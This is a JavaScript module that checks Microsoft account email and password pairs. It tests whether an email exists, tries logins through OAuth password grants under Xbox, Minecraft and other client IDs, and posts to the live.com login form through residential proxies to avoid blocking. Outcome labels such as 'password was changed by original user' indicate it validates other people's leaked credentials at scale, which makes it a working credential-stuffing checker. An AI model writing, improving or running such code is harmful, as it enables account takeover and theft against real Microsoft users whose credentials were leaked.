/**
 * Microsoft checker with optional proxy (required for reliable password checks on Render).
 *
 * Env:
 *   MS_CHECK_PROXY=http://user:pass@host:port
 *   HTTPS_PROXY / HTTP_PROXY also work
 *   PASS_WORKER_URL=https://selenium-worker  (best)
 *
 * Messages:
 *   This Email doesn't exist
 *   Not loginable
 *   password was changed by original user
 *   Login OK
 */
const MSG = {
  NO_EMAIL: "This Email doesn't exist",
  NOT_LOGINABLE: 'Not loginable',
  PASS_CHANGED: 'password was changed by original user',
  OK: 'Login OK'
};

const UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

let _dispatcher = null;
let _fetchImpl = globalThis.fetch;
let _proxyUrl = '';

function initProxy() {
  if (_dispatcher !== null) return;
  _proxyUrl = (
    process.env.MS_CHECK_PROXY ||
    process.env.HTTPS_PROXY ||
    process.env.HTTP_PROXY ||
    process.env.https_proxy ||
    process.env.http_proxy ||
    ''
  ).trim();

  try {
    const undici = require('undici');
    _fetchImpl = undici.fetch || globalThis.fetch;
    if (_proxyUrl) {
      _dispatcher = new undici.ProxyAgent(_proxyUrl);
      console.log('[msCheck] Using proxy', _proxyUrl.replace(/\/\/.*:.*@/, '//***:***@'));
    } else if (undici.EnvHttpProxyAgent) {
      try {
        _dispatcher = new undici.EnvHttpProxyAgent();
      } catch (_) {
        _dispatcher = false;
      }
    } else {
      _dispatcher = false;
    }
  } catch (_) {
    _dispatcher = false;
    _fetchImpl = globalThis.fetch;
  }
}

async function msFetch(url, opts = {}) {
  initProxy();
  const headers = Object.assign({ 'User-Agent': UA }, opts.headers || {});
  const o = Object.assign({}, opts, { headers });
  if (_dispatcher) o.dispatcher = _dispatcher;
  return _fetchImpl(url, o);
}

function cleanEmail(e) {
  return String(e || '').trim().toLowerCase();
}

function pickCookies(res) {
  try {
    if (typeof res.headers.getSetCookie === 'function') {
      const arr = res.headers.getSetCookie();
      if (arr && arr.length) return arr.map((c) => c.split(';')[0]).join('; ');
    }
  } catch (_) {}
  const sc = res.headers.get('set-cookie');
  if (!sc) return '';
  return sc
    .split(/,(?=\s*[^;=]+=)/)
    .map((c) => c.split(';')[0].trim())
    .join('; ');
}

function mergeCookie(a, b) {
  const map = {};
  for (const src of [a, b]) {
    String(src || '')
      .split(';')
      .map((s) => s.trim())
      .filter(Boolean)
      .forEach((p) => {
        const i = p.indexOf('=');
        if (i > 0) map[p.slice(0, i)] = p.slice(i + 1);
      });
  }
  return Object.entries(map)
    .map(([k, v]) => k + '=' + v)
    .join('; ');
}

async function getCredentialType(email) {
  let cookies = '';
  try {
    const warm = await msFetch('https://login.live.com/login.srf?wa=wsignin1.0&mkt=EN-US&id=292841', {
      headers: { Accept: 'text/html' },
      redirect: 'follow'
    });
    cookies = pickCookies(warm);
  } catch (_) {}

  const res = await msFetch('https://login.live.com/GetCredentialType.srf?mkt=EN-US&id=292841', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json; charset=utf-8',
      Accept: 'application/json',
      Cookie: cookies,
      Origin: 'https://login.live.com',
      Referer: 'https://login.live.com/'
    },
    body: JSON.stringify({
      username: email,
      uaid: '',
      isOtherIdpSupported: true,
      checkPhones: false,
      isRemoteNGCSupported: true,
      isCookieBannerShown: false,
      isFidoSupported: true,
      forceotclogin: false,
      otclogindisallowed: false,
      isExternalFederationDisallowed: false,
      isRemoteConnectSupported: false,
      federationFlags: 0,
      isSignup: false,
      flowToken: ''
    })
  });
  const data = await res.json().catch(() => null);
  cookies = mergeCookie(cookies, pickCookies(res));
  return { data, cookies, http: res.status };
}

function fromCredentialType(data) {
  if (!data || typeof data !== 'object') return { known: false };
  const code = data.IfExistsResult;
  if (code === 1 || code === 4) {
    return { known: true, exists: false, msg: MSG.NO_EMAIL };
  }
  if (code !== 0 && code !== 2 && code !== 5 && code !== 6) {
    return { known: false, code };
  }
  const creds = data.Credentials || {};
  if (creds.FederationRedirectUrl && creds.HasPassword === false) {
    return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE };
  }
  if (creds.HasPassword === false) {
    return { known: true, exists: true, hasPassword: false, msg: MSG.NOT_LOGINABLE };
  }
  return {
    known: true,
    exists: true,
    hasPassword: creds.HasPassword === true || creds.HasPassword === undefined,
    preferOther: creds.PrefCredential != null && creds.PrefCredential !== 0
  };
}

function mapOauthData(data, http) {
  if (http === 200 && (data.access_token || data.refresh_token)) {
    return { definitive: true, ok: true, msg: MSG.OK };
  }
  const codes = [].concat(data.error_codes || []).map(String);
  const desc = String(data.error_description || data.error_message || data.message || data.error || '');
  const blob = (codes.join(' ') + ' ' + desc).toLowerCase();

  if (codes.includes('50034') || /aadsts50034|user account does not exist|user not found/i.test(blob)) {
    return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
  }
  if (
    codes.includes('50126') ||
    /aadsts50126|invalid username or password|password is incorrect/i.test(blob)
  ) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }
  if (
    codes.some((c) => ['50076', '50079', '50072', '50158', '50140', '53003', '53004', '50097'].includes(c)) ||
    /aadsts50076|aadsts50079|multi-factor|mfa required|strong authentication|proofup/i.test(blob)
  ) {
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }
  if (codes.some((c) => ['50057', '50005', '50053'].includes(c)) || /account is locked|disabled/i.test(blob)) {
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }
  return { definitive: false, raw: desc.slice(0, 200) };
}

async function oauthTry(email, password, clientId, tokenUrl, scope) {
  const body = new URLSearchParams({
    grant_type: 'password',
    client_id: clientId,
    username: email,
    password: password,
    scope: scope
  });
  if (tokenUrl.includes('login.live.com')) {
    body.set('redirect_uri', 'https://login.live.com/oauth20_desktop.srf');
  }
  const res = await msFetch(tokenUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Accept: 'application/json'
    },
    body: body.toString()
  });
  const data = await res.json().catch(() => ({}));
  return mapOauthData(data, res.status);
}

/** Full HTML password login (works through residential proxy) */
async function htmlPasswordCheck(email, password, seedCookies) {
  const loginUrl = 'https://login.live.com/login.srf?wa=wsignin1.0&mkt=en-US&id=292841';
  const pageRes = await msFetch(loginUrl, {
    headers: {
      Accept: 'text/html',
      Cookie: seedCookies || '',
      'Accept-Language': 'en-US,en;q=0.9'
    },
    redirect: 'follow'
  });
  const html = await pageRes.text();
  let cookies = mergeCookie(seedCookies, pickCookies(pageRes));

  const ppft =
    (html.match(/name="PPFT"[^>]*value="([^"]+)"/i) || [])[1] ||
    (html.match(/"sFT":"([^"]+)"/i) || [])[1] ||
    (html.match(/sFT:'([^']+)'/i) || [])[1] ||
    '';

  let urlPost =
    (html.match(/urlPost:"([^"]+)"/i) || [])[1] ||
    (html.match(/urlPost:'([^']+)'/i) || [])[1] ||
    'https://login.live.com/ppsecure/post.srf';
  urlPost = urlPost.replace(/\\u0026/g, '&').replace(/\\\//g, '/');

  if (!ppft) return { definitive: false, reason: 'no_ppft' };

  const form = new URLSearchParams({
    login: email,
    loginfmt: email,
    passwd: password,
    PPFT: ppft,
    type: '11',
    LoginOptions: '3',
    NewUser: '1',
    PPSX: 'Passp',
    ps: '2',
    i13: '0',
    i19: '12000',
    IsFidoSupported: '1'
  });

  const postRes = await msFetch(urlPost, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      Cookie: cookies,
      Origin: 'https://login.live.com',
      Referer: loginUrl
    },
    body: form.toString(),
    redirect: 'manual'
  });

  const loc = postRes.headers.get('location') || '';
  const body = await postRes.text().catch(() => '');
  const all = (body + '\n' + loc).toLowerCase();

  if (/account\.microsoft\.com|office\.com|onedrive|completesignin|oauth20/i.test(loc)) {
    if (/proof|identity|otp|securitycode|interrupt/i.test(loc + body)) {
      return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
    }
    return { definitive: true, ok: true, msg: MSG.OK };
  }
  if (/password is incorrect|account or password is incorrect|serrorcode["\s:]*["']?80041012/i.test(all)) {
    return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
  }
  if (/that microsoft account doesn'?t exist|we couldn'?t find an account/i.test(all)) {
    return { definitive: true, ok: false, msg: MSG.NO_EMAIL };
  }
  // Other ways page: if password was offered and failed, or only code
  if (/other ways to sign in|sign in another way|use a code|authenticator|verify your identity/i.test(all)) {
    if (/name="passwd"|type="password"/i.test(body)) {
      // password form still there — treat incorrect as pass changed if error text
      const err = (body.match(/id="passwordError"[^>]*>([^<]+)</i) || [])[1] || '';
      if (/incorrect|wrong/i.test(err)) return { definitive: true, ok: false, msg: MSG.PASS_CHANGED };
      // Has password field under other ways → try was done; no clear error
      return { definitive: false, reason: 'other_ways_with_password_field' };
    }
    return { definitive: true, ok: false, msg: MSG.NOT_LOGINABLE };
  }

  if (postRes.status === 200 && /name="passwd"/i.test(body)) {
    const err =
      (body.match(/id="passwordError"[^>]*>([^<]+)</i) || [])[1] ||
      (body.match(/id="usernameError"[^>]*>([^<]+)</i) || [])[1] ||
      '';
    if (/incorrect|wrong/i.test(err)) return { definitive: true, ok: false, msg: MSG.PASS_CHANGED, raw: err };
    if (/doesn'?t exist|couldn'?t find/i.test(err)) return { definitive: true, ok: false, msg: MSG.NO_EMAIL, raw: err };
  }

  return { definitive: false, reason: 'html_inconclusive', http: postRes.status };
}

async function tryWorker(email, password) {
  const base = String(process.env.PASS_WORKER_URL || '').replace(/\/$/, '');
  if (!base) return null;
  try {
    const res = await msFetch(base + '/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, type: 'check' })
    });
    return await res.json().catch(() => null);
  } catch (e) {
    return { error: e.message };
  }
}

function mapWorker(data) {
  if (!data) return null;
  if (data.ok === true || data.status === 'success') {
    return { ok: true, summary: MSG.OK, error: null };
  }
  const err = String(data.error || data.message || data.result || '').toLowerCase();
  if (!err) return null;
  if (/50034|not exist|doesn'?t exist|no account/.test(err)) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL };
  }
  if (/50126|incorrect|wrong password|invalid username or password/.test(err)) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED };
  }
  if (/50076|50079|mfa|2fa|authenticator|not loginable|no password|otp/.test(err)) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE };
  }
  return null;
}

async function checkMicrosoft(email, password) {
  initProxy();
  email = cleanEmail(email);
  password = String(password || '');
  const details = { proxy: !!_proxyUrl, steps: [] };

  if (!email.includes('@')) {
    return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
  }
  if (!password) {
    return { ok: false, summary: MSG.PASS_CHANGED, error: MSG.PASS_CHANGED, details };
  }

  const worker = await tryWorker(email, password);
  if (worker) {
    details.worker = worker;
    const m = mapWorker(worker);
    if (m) return { ...m, details };
  }

  let ctInfo = { known: false };
  let cookies = '';
  try {
    const ct = await getCredentialType(email);
    details.credentialType = ct.data;
    details.steps.push('ct:' + ct.http);
    cookies = ct.cookies || '';
    ctInfo = fromCredentialType(ct.data);
    details.exists = ctInfo;
    if (ctInfo.known && ctInfo.exists === false) {
      return { ok: false, summary: MSG.NO_EMAIL, error: MSG.NO_EMAIL, details };
    }
    if (ctInfo.msg === MSG.NOT_LOGINABLE && ctInfo.hasPassword === false) {
      return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
    }
  } catch (e) {
    details.ctError = e.message;
  }

  // OAuth — definitive codes only
  const clients = [
    ['000000004C12AE6F', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'],
    ['00000000402b5328', 'https://login.live.com/oauth20_token.srf', 'service::user.auth.xboxlive.com::MBI_SSL'], // Minecraft
    ['1f907974-e22b-4810-a9de-d282292ec59c', 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'openid offline_access'],
    ['d3590ed6-52b3-4102-aeff-aad2292ab01c', 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'openid offline_access']
  ];
  for (const [id, url, scope] of clients) {
    try {
      const r = await oauthTry(email, password, id, url, scope);
      details.steps.push({ oauth: id, def: r.definitive, msg: r.msg, raw: r.raw });
      if (r.definitive) {
        return { ok: !!r.ok, summary: r.msg, error: r.ok ? null : r.msg, details };
      }
    } catch (e) {
      details.steps.push({ oauth: id, err: e.message });
    }
  }

  // HTML password (needs proxy on Render)
  try {
    const html = await htmlPasswordCheck(email, password, cookies);
    details.html = html;
    if (html.definitive) {
      return { ok: !!html.ok, summary: html.msg, error: html.ok ? null : html.msg, details };
    }
  } catch (e) {
    details.htmlError = e.message;
  }

  if (ctInfo.known && ctInfo.exists && ctInfo.hasPassword === false) {
    return { ok: false, summary: MSG.NOT_LOGINABLE, error: MSG.NOT_LOGINABLE, details };
  }

  // Honest + actionable
  const tip = _proxyUrl
    ? 'Proxy set but Microsoft still blocked. Try another residential proxy or PASS_WORKER_URL.'
    : 'Set MS_CHECK_PROXY=http://user:pass@host:port (residential) or PASS_WORKER_URL for Selenium.';

  return {
    ok: false,
    summary: tip,
    error: tip,
    details
  };
}

module.exports = { checkMicrosoft, MSG };
